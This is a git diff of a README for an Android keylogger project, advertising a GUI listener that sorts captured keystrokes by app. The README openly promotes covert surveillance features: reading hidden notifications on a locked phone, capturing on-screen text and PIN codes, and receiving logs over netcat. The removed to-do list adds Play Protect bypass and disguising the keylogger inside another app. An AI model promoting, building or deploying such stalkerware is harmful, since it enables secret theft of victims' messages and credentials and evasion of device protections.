@@ -1,18 +1,37 @@
 ![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com)
-# Massive one of a kind filtered listerner in the works, many milestones reached, see bottom.
-# android-keylogger (also shows received messages, even when locked and hidden)
-To-Do
-- [ ] clean up this mess
-- [X] make a listener (in release) MAKING A COOLER ONE RIGHT NOW :)
-- [ ] work on theme
-- [X] Runs In Background
-- [ ] discord listener bot
-- [X] Support Android v5 - v13
-- [X] update message sender for clean output and or update listener
-- [X] Bypass PlayProtect
-- [ ] add guides and gifs, well as renaming service
-- [ ] more stealth in android 10 and up (need more than a white app icon that opens to app info) api makes it not hideable without root
-- [ ] hide/bind keylogger with another working app for hiding in plain sight
+
+# android-keylogger java listener update!
+![Screenshot 2023-01-24 232719](https://user-images.githubusercontent.com/28081004/214481086-70f933da-e438-4ee8-9a41-b7de22a4b58a.png)
+note that it may print logs in all tabs at times but the filter works.
+this is not perfect but i did my best to sort some of the output because at first it printed 1 letter per row reading
+t
+t
+e
+s
+t
+test
+but even worse, so i coded these tabs to wait for a certain word like "Signal" from the logs tab then apend to signal tab then
+  it trys to stop printing in signal tab when it reads keyboard hidden or recent apps to stop the filter.
+   its not perfect but the sorting these tabs do is a huge help in saving time reading logs.
+    its designed to stop printing in certain tabs when the keyboard closes but its not perfect and it will print in all tabs
+     at times but the filters will still work, this is 100 times better than just the logs tab, if youre logs are not showing just wait
+      up to 2 mins. during testing MOST keys stay in their respective tabs. may try to edit the filter some more.
+
+# Listener Features
+- reads hidden notifications in locked state
+- grabs almost all text on the screen the user is looking at.
+- filtered tabs for different apps to reduce logs for easy reading (it does its best and 100 times better than straight logs, see for youreself
+- 200 lines of error free custom code 
+- gets pin code
+- auto scrolling
+- works in windows and linux as a .exe, .java, and .jar
+- asks user for ip and port with autofill (double check correct ip and port)
+- cute cat icon 
+
+
+
+
+# works on lock screen
 ![Screenshot_20230121_091918](https://user-images.githubusercontent.com/28081004/213873094-bc139731-67c2-4190-af5d-c57d3b4bdf6f.png)
 
 no need to build ip or port into apk before install
@@ -60,7 +79,8 @@ no manual fix.dat required
 
 
 # VIEWING LOGS
-![Screenshot_20230121_092543](https://user-images.githubusercontent.com/28081004/213873151-b06c1b07-71cb-4c1d-89b9-d8416eeec27b.png)
+![Screenshot 2023-01-25 001403](https://user-images.githubusercontent.com/28081004/214485413-54df17f6-7478-4d15-bbe0-da02d2d3618d.png)
+new updated logger with gui
 
 see and record each key press in real time
 open net cat and do
@@ -125,18 +145,3 @@ https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=sea
 https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm
 
 
-# custom coded listener features (I have not released this yet)
-- [X] add prompt for users ip and port
-- [X] auto add users ip and auto add port 444 in text box
-- [X] added auto scrolling
-- [X] GUI
-- [X] filters to clean up output like no other to a sane human readable format
-- [X] Sort keyloggs by app (re-wrote it about 20 times to clean up sending 1 leter per line) :) huge project goal
-- [ ] multiple client support filtering
-- [ ] custom sorting
-- [X] cute cat icon
-- [X] log date and time
-
-this should be the star of the project as you should be able to use it to sort any messy keylogger output you can catch with any shell,
- this will be the listener of android keyloggers ro rule them all, every single one shows messy output as you can see in the picture.
-Leave a star star for some motivation if you like my work or would love to see this update, very fun for me to share this with you guys.
